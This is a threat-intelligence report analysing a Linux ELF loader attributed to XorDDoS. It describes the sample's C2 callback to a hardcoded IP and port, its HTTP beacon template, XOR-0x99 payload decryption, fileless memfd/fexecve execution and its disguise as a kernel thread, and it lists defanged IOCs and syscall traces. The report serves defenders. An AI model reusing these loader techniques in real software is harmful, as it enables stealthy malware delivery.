---
title: "Malicious sample analysis: XorDDoS (ELF · elf · dcefe4cd)"
published: 2026-11-24
draft: false
description: "Malicious (confidence: low): XorDDoS · loader/downloader · difficulty medium · dynamic sandbox + static decompilation"
tags: ["XorDDoS", "loader", "downloader", "ELF"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-24-XorDDoS-dcefe4cd"
---

> [!WARNING]
> **Verdict: malicious** · Family **XorDDoS** (unconfirmed) · Confidence **low**
> 
> Aliases: Linux/XOR.DDoS, XOR.DDoS
> 
> Static decompilation shows this 32-bit Linux ELF has a complete "callback-download-in-memory execution" chain: at startup it uses access to check the /tmp/log_de.log single-instance marker, connects to the hardcoded 8.140.232[.]67:8084 and sends an HTTP GET registration beacon, then decrypts the response body with a single-byte XOR of 0x99 and writes it into a memfd, finally executing the next-stage payload from memory as [kworker/0:2] via fexecve. Real execution in the isolated sandbox observed repeated attempts to connect to that C2 (retrying every 10 seconds after ENETUNREACH), behavior inconsistent with normal software.

## Quick Overview

| Item | Content |
|:--|:--|
| Family | **XorDDoS** · Aliases Linux/XOR.DDoS, XOR.DDoS · _unconfirmed_ |
| Confidence | **low** |
| Behavior class | loader · downloader |
| Difficulty | medium |
| First seen | 2026-11-22 02:27:41 |
| Analysis method | Dynamic sandbox analysis (Linux sample) + static decompilation |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/dcefe4cd898825de4a262f455d742656a1c9eb61b404c51777652fd37c6d4f03/) |

## Attack Chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="34" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Check singleton marker</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1480</text>
<rect x="586" y="23" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="38" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">Dynamic</text>
<circle cx="26" cy="84" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="84" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Connect back to fixed C2</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<rect x="586" y="73" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="88" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">Dynamic</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Send HTTP registration beacon</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">XOR-decrypt downloaded payload</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">Carry payload in memfd</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1620</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
</svg>

## Sample Identification

| Item | Value |
|:--|:--|
| SHA-256 | `dcefe4cd898825de4a262f455d742656a1c9eb61b404c51777652fd37c6d4f03` |
| MD5 | _Not recorded_ |
| Size | 7,262 bytes (7.1 KB) |
| Type | ELF · `elf` |

## Behavior Analysis

There are **7** behaviors in total, each backed by evidence; **5** are statically available and **2** were obtained through dynamic analysis.

### 1. Check single-instance marker

`T1480` · Confidence **high** · Dynamic

After startup it uses access to check whether /tmp/log_de.log exists, exiting with exit(0) if so, to avoid repeated runs that could expose it.

> **Evidence**: within main @0x80486e0, call access@0x8048707, with the path string at 0x8048ae0="/tmp/log_de.log"; dynamic tracing observed access("/tmp/log_de.log", F_OK) = ENOENT, after which execution continued
> 
> **Source**: `ev-000002` · `ev-000010` · `ev-000018`

### 2. Connect back to fixed C2

`T1071.001` · Confidence **high** · Dynamic

It uses socket/connect to reach the hardcoded 8.140.232[.]67:8084 and retries indefinitely with sleep(10) on failure, forming a persistent callback.

> **Evidence**: main @0x80487be call connect, sockaddr port word 0x941f (8084 after htons); dynamic tracing connect(3, {AF_INET, htons(8084), 8.140.232[.]67}) = ENETUNREACH, followed by clock_nanosleep 10s and another retry
> 
> **Source**: `ev-000002` · `ev-000016` · `ev-000017`

### 3. Send HTTP registration beacon

`T1071.001` · Confidence **high** · Static

After a successful connection it sends an HTTP/1.1 request GET /?a=l32&h=8.140.232[.]67&t=ws_&p=8084 and masquerades the traffic with the Windows Firefox 48 User-Agent.

> **Evidence**: rodata from 0x8048b19 is "GET /?a=%s&h=%s&t=%s&p=%d HTTP/1.1…", 0x8048b15="l32", 0x8048b11="ws_"; main @0x804881b call send
> 
> **Source**: `ev-000001` · `ev-000002` · `ev-000018`

### 4. XOR-decrypt downloaded payload

`T1027` · Confidence **high** · Static

It decrypts every byte of the C2 response stream with ^0x99 and writes the result to an in-memory file descriptor, preparing for the next execution step.

> **Evidence**: main @0x80486e0 decompilation: inside the recv loop, *pbVar11 ^= 0x99 followed by write(fd, buf, n); no separate key table, the key is an immediate
> 
> **Source**: `ev-000002`

### 5. Carry payload in memfd

`T1620` · Confidence **high** · Static

It calls syscall(356)=memfd_create("a", MFD_CLOEXEC) to create an anonymous memory file and writes the decrypted payload into it, avoiding an executable file on disk.

> **Evidence**: main @0x80486e0: syscall(0x164, "a"@0x8048b9c, 1, …) returns fd, followed by write(fd, decrypted buffer, n)
> 
> **Source**: `ev-000002`

### 6. Execute disguised as a kernel thread

`T1036.005` · Confidence **high** · Static

It executes the in-memory payload directly via fexecve, sets argv[0] to [kworker/0:2] to impersonate a kernel thread, and sets the CWD environment variable to the sample's own real path to pass along the runtime context.

> **Evidence**: main: realpath(*argv)→setenv("CWD", path, 1); argv={"[kworker/0:2]"@0x8048b9e}; call fexecve(fd, argv, environ)
> 
> **Source**: `ev-000002`

### 7. Parse response headers then receive payload

`T1071.001` · Confidence **medium** · Static

It receives the C2 response byte by byte and detects the \r\n\r\n header terminator, then enters the payload-receiving loop.

> **Evidence**: main @0x804883a call recv; the loop compares consecutive 0x0d/0x0a four-byte sequences to determine the end of the headers
> 
> **Source**: `ev-000002`


## IOCs (defanged)

### Network

:::caution
**Pending dynamic verification**: The above addresses come from static analysis; no successful connection or session was observed in the network-isolated analysis environment, and the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://8[.]140[.]232[.]67:8084/` | 8084 | c2 | Static | ⏳ Not observed |

### Host

**Drop path**

- `/tmp/log_de.log`
- `/proc/self/exe (obtained via realpath(argv[0]), passed as the CWD environment variable)`

### Configuration

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `8.140.232[.]67` | Yes | Static |
| `c2_port` | `8084` | Yes | Static |
| `c2_uri` | `/?a=%s&h=%s&t=%s&p=%d` | Yes | Static |
| `campaign_tag` | `a=l32, t=ws_` | Yes | Static |
| `user_agent` | `Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0` | Yes | Static |
| `encryption_algo` | `single-byte XOR, key 0x99 (applied to the payload byte stream returned by the C2)` | Yes | Static |
| `memfd_name` | `a` | Yes | Static |
| `masquerade_argv0` | `[kworker/0:2]` | Yes | Static |
| `singleton_path` | `/tmp/log_de.log` | Yes | Static |
| `reconnect_interval_sec` | `10` | No | Static |

## Do Not Misjudge

:::important
The following conclusions are **easy to misjudge**; please note them when citing this report.

- Do not assert that this sample itself performs DDoS or data theft: it only handles callback and in-memory loading, and the actual impact depends on the second-stage payload that was not obtained.
- Do not assert that a C2 session succeeded or a payload was delivered: all connections in the analysis window returned ENETUNREACH due to network isolation, and no HTTP request/response was observed.
- Do not treat /tmp/log_de.log as a file created by the sample: the sample only checks its existence and never creates or writes that path.
- Do not classify it as ransomware or a miner based on the 0x99 XOR: there are no file-encryption, mining-pool or wallet-related features.
:::

## Analysis Method and Limitations

| Item | Content |
|:--|:--|
| Analysis method | Dynamic sandbox analysis (Linux sample) + static decompilation |
| Unpacking | No |

**Limitations and pending verification**

1. The dynamic run was in a network-isolated environment; every connect returned ENETUNREACH, no C2 response or second-stage payload was obtained, and the XOR-decrypt→memfd→fexecve execution path was never actually traversed.
2. With no vendor engine, YARA or public sandbox report as corroboration, the family attribution is an inference from behavioral features and is not the only possible conclusion.
3. This run covers a 32-bit x86 Linux ELF; other architectures/variants were not verified. The sample depends on libc.so.6 and /lib/ld-linux.so.2.
4. /tmp/log_de.log is only existence-checked; its creator is presumably external deployment or a later stage and does not appear in this sample's code.

## Evidence Index

<details>
<summary>Expand 8 tool evidence entries</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ev-000001` | String extraction | Extracted 111 ASCII strings, locating /tmp/log_de.log, 8.140.232[.]67, the HTTP GET template and the User-Agent |
| `ev-000002` | decompile.function | Decompiled main @0x80486e0, recovering the full single-instance check, callback, beacon, XOR 0x99, memfd_create and fexecve chain |
| `ev-000003` | dyn.trace | Real execution start event execve("./prog") |
| `ev-000010` | dyn.trace | access("/tmp/log_de.log", F_OK) = ENOENT, confirming the single-instance check really occurred |
| `ev-000015` | dyn.trace | socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3 |
| `ev-000016` | dyn.trace | connect(3, {AF_INET, htons(8084), 8.140.232[.]67}) = ENETUNREACH |
| `ev-000017` | dyn.trace | connect to the same C2 again 10 seconds later, confirming the infinite-reconnect logic |
| `ev-000018` | static.read | Hex verification of rodata: 0x8048b11="ws_", 0x8048b15="l32", 0x8048b19=GET template, 0x8048b9c="a", 0x8048b9e="[kworker/0:2]"; and re-verified SHA-256 |

</details>

---

_The sample in this report is not public, IOCs have been defanged, and this is for security research only._
